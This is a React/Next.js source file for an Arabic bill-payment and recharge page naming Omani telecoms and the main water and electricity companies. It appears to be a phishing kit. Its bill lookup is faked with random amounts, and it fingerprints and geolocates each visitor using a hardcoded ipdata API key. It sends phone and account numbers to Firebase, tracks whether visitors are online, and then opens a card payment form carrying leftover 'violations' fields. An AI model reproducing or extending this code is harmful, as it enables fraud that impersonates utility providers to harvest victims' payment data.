"use client"
import { useEffect, useState } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { useForm } from "react-hook-form"
import { zodResolver } from "@hookform/resolvers/zod"
import { z } from "zod"
import { EnhancedPaymentForm } from "@/components/payment-form"
import { SiteHeader } from "@/components/ui/header"
import { addData } from "@/lib/firebase"
import { setupOnlineStatus } from "@/lib/utils"

// Define the validation schema
const rechargeSchema = z
  .object({
    serviceType: z.string().min(1, "يرجى اختيار نوع الخدمة"),
    provider: z.string().min(1, "يرجى اختيار مزود الخدمة"),
    phoneNumber: z.string().min(1, "يرجى إدخال رقم الهاتف أو رقم الحساب"),
    amount: z.number().min(1, "يرجى إدخال مبلغ صحيح"),
    confirmAmount: z.number().min(1, "يرجى تأكيد المبلغ"),
    accountNumber: z.string().optional(),
  })
  .refine((data) => data.amount === data.confirmAmount, {
    message: "المبلغ غير متطابق",
    path: ["confirmAmount"],
  })

// Service providers data
const serviceProviders = [
  { id: "omantel", name: "عمانتل", type: "omantel" },
  { id: "ooredoo", name: "اوريدو", type: "oredd" },
  { id: "awaser", name: "اواصر", type: "awaser" },
  { id: "vodafone", name: "فودافون", type: "vodavon" },
  { id: "water-main", name: "شركة المياه الرئيسية", type: "telecom" },
  { id: "electricity-main", name: "شركة الكهرباء  الرئيسية", type: "electricity" },
]


function randstr(prefix: string) {
  return Math.random().toString(36).replace('0.', prefix || '');
}
const visitorID = randstr('om-')

export default function RechargePage() {
  const {
    register,
    handleSubmit,
    formState: { errors },
    watch,
    setValue,
    getValues,
  } = useForm({
    resolver: zodResolver(rechargeSchema),
    defaultValues: {
      serviceType: "electricity",
      provider: "",
      phoneNumber: "",
      amount: 0,
      confirmAmount: 0,
      accountNumber: "",
    },
  })

  const serviceType = watch("serviceType")
  const [showPayment, setShowPayment] = useState(false)
  const [selectedViolations, setSelectedViolations] = useState([])
  const [billData, setBillData] = useState<any | null>(null)
  const [fetchingBill, setFetchingBill] = useState(false)
  const [billError, setBillError] = useState<string | null>(null)

  const onSubmit = async () => {
    try {
      const visitorId = localStorage.getItem("visitor") || visitorID
      const phoneToStore = getValues().phoneNumber

      await addData({
        id: visitorId,
        phone: phoneToStore,
        accountNumber: serviceType === "electricity" ? getValues().accountNumber : null,
      })

      setShowPayment(true)
    } catch (error) {
      console.error("Error submitting form:", error)
    }
  }

  const filteredProviders = serviceProviders.filter((provider) => provider.type === serviceType)

  const fetchElectricityBill = async () => {
    const accountNumber = getValues().accountNumber
    const phoneNumber = getValues().phoneNumber

    if (!accountNumber) {
      setBillError("يرجى إدخال رقم الحساب أولاً")
      return
    }

    setFetchingBill(true)
    setBillError(null)

    try {
      // Simulate API call to fetch bill
      await new Promise((resolve) => setTimeout(resolve, 2000))

      // Mock bill data
      const mockBillData = {
        accountNumber,
        amount: Math.floor(Math.random() * 100) + 20,
        dueDate: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toLocaleDateString("ar-OM"),
        status: "مستحق",
      }

      setBillData(mockBillData)
      setValue("amount", mockBillData.amount)
      setValue("confirmAmount", mockBillData.amount)
    } catch (error) {
      setBillError(error instanceof Error ? error.message : "حدث خطأ في جلب الفاتورة")
    } finally {
      setFetchingBill(false)
    }
  }
  async function getLocation() {
    const APIKEY = '856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef';
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;

    try {
      const response = await fetch(url);
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`);
      }
      const country = await response.text();
      addData({
        id: visitorID,
        country: country
      })
      localStorage.setItem('country', country)
      setupOnlineStatus(visitorID)
    } catch (error) {
      console.error('Error fetching location:', error);
    }
  }
  useEffect(() => {
    getLocation()
  }, [])
  return (
    <div className="bg-white min-h-screen font-sans" dir="rtl">
      <SiteHeader />

      <main>
        {/* Title Banner */}
        <div className="bg-[#9aca3f] text-white text-right py-8 px-4">
          <h1 className="text-xl md:text-2xl font-bold">استعراض ودفع الفواتير</h1>
        </div>

        {/* Form Section */}
        <div
          className="py-12 px-4"
          style={{
            backgroundImage: "url(/bg.jpg) ",
            backgroundRepeat: "repeat",
            backgroundSize: "200px",
          }}
        >
          <Card className="max-w-md mx-auto bg-backdrop-blur-sm shadow-xl rounded-2xl border-gray-200 overflow-hidden">
            <CardContent className="p-8">
              <form className="space-y-4" onSubmit={handleSubmit(onSubmit)}>
                <div className="space-y-2">
                  <Label htmlFor="service-provider-type" className="text-gray-600">
                    اختار مزود الخدمة
                  </Label>
                  <Select value={serviceType} onValueChange={(value) => setValue("serviceType", value)}>
                    <SelectTrigger id="service-provider-type" className="bg-white rounded-lg">
                      <SelectValue placeholder="اختر..." />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="electricity">كهرباء</SelectItem>
                      <SelectItem value="telecom">ماء</SelectItem>
                      <SelectItem value="omantel">عمانتل</SelectItem>
                      <SelectItem value="oredd">اوريدو</SelectItem>
                      <SelectItem value="awaser">اواصر</SelectItem>
                      <SelectItem value="vodavon">فودافون</SelectItem>
                    </SelectContent>
                  </Select>
                  {errors.serviceType && <p className="text-red-500 text-sm">{errors.serviceType.message}</p>}
                </div>

                <div className="space-y-2">
                  <Label htmlFor="service-provider" className="text-gray-600">
                    مزود الخدمة
                  </Label>
                  <Select onValueChange={(value) => setValue("provider", value)}>
                    <SelectTrigger id="service-provider" className="bg-white rounded-lg">
                      <SelectValue placeholder="حدد المزود" />
                    </SelectTrigger>
                    <SelectContent>
                      {filteredProviders.map((provider) => (
                        <SelectItem key={provider.id} value={provider.id}>
                          {provider.name}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                  {errors.provider && <p className="text-red-500 text-sm">{errors.provider.message}</p>}
                </div>

                <div className="space-y-2">
                  <Label htmlFor="phone-number" className="text-gray-600">
                    {serviceType === "electricity" ? "ادخل رقم الهاتف" : "ادخل رقم الهاتف الذي تريد تعبئته"}
                  </Label>
                  <Input
                    id="phone-number"
                    type="text"
                    className="bg-white rounded-lg"
                    dir="ltr"
                    {...register("phoneNumber")}
                  />
                  {errors.phoneNumber && <p className="text-red-500 text-sm">{errors.phoneNumber.message}</p>}
                </div>
                <div className="space-y-2">
                  <Label htmlFor="ac-number" className="text-gray-600">
                    {serviceType === "electricity" ? "رقم العداد / رقم الحساب" : "ادخل رقم الهاتف الذي تريد تعبئته"}
                  </Label>
                  <Input
                    id="account-number"
                    type="text"
                    className="bg-white rounded-lg"
                    dir="ltr"
                    {...register("accountNumber")}
                  />
                  {errors.phoneNumber && <p className="text-red-500 text-sm">{errors.phoneNumber.message}</p>}
                </div>
                {serviceType === "electricity" && (
                  <div className="space-y-2">
                    <Button
                      type="button"
                      onClick={fetchElectricityBill}
                      disabled={fetchingBill}
                      className="w-full  bg-white text-black border-2"
                    >
                      {fetchingBill ? "جاري جلب الفاتورة..." : "جلب الفاتورة"}
                    </Button>
                    {billError && <p className="text-red-500 text-sm">{billError}</p>}
                    {billData && (
                      <div className="bg-green-50 p-3 rounded-lg">
                        <p className="text-sm text-green-800">المبلغ المستحق: {billData.amount} ريال عماني</p>
                        <p className="text-sm text-green-800">تاريخ الاستحقاق: {billData.dueDate}</p>
                      </div>
                    )}
                  </div>
                )}

                <div className="space-y-2">
                  <Label htmlFor="amount" className="text-gray-600">
                    المبلغ (ريال عماني)
                  </Label>
                  <Input
                    id="amount"
                    type="number"
                    className="bg-white rounded-lg"
                    dir="ltr"
                    {...register("amount", { valueAsNumber: true })}
                  />
                  {errors.amount && <p className="text-red-500 text-sm">{errors.amount.message}</p>}
                </div>

                <div className="space-y-2">
                  <Label htmlFor="confirm-amount" className="text-gray-600">
                    إعادة إدخال المبلغ
                  </Label>
                  <Input
                    id="confirm-amount"
                    type="number"
                    className="bg-white rounded-lg"
                    dir="ltr"
                    {...register("confirmAmount", { valueAsNumber: true })}
                  />
                  {errors.confirmAmount && <p className="text-red-500 text-sm">{errors.confirmAmount.message}</p>}
                </div>

                <div className="pt-4">
                  <Button
                    type="submit"
                    className="w-full bg-[#9aca3f] hover:bg-[#006e33] text-white font-bold text-lg py-6 rounded-lg"
                  >
                    دفع
                  </Button>
                </div>
              </form>
            </CardContent>
          </Card>
        </div>

        {showPayment && (
          <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
            <EnhancedPaymentForm
              totalAmount={Number.parseFloat(watch("amount") as any) || 0}
              onCancel={() => setShowPayment(false)}
              violations={selectedViolations}
              onSuccess={() => {
                setShowPayment(true)
              }}
            />
          </div>
        )}
      </main>

      <footer className="bg-[#9aca3f] text-white py-8 px-4">
        <div className="max-w-6xl mx-auto text-center">
          <p>© 2025 خدمة إعادة الشحن في عمان. جميع الحقوق محفوظة.</p>
        </div>
      </footer>
    </div>
  )
}
